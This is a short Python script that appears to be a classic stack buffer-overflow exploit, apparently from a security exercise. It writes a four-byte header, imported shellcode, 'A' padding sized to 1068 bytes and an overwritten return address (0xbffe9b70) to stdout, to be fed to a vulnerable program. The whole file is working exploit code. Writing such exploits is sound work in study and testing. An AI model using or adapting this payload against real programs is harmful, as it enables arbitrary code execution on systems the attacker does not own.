import sys
from shellcode import shellcode

a = b'\x00'+b'\x00'+b'\x0e'+b'\x80'
b = b'A' * (1068-len(shellcode)) + b'\x70'+b'\x9b'+ b'\xfe'+ b'\xbf'

sys.stdout.buffer.write(a+shellcode+b)
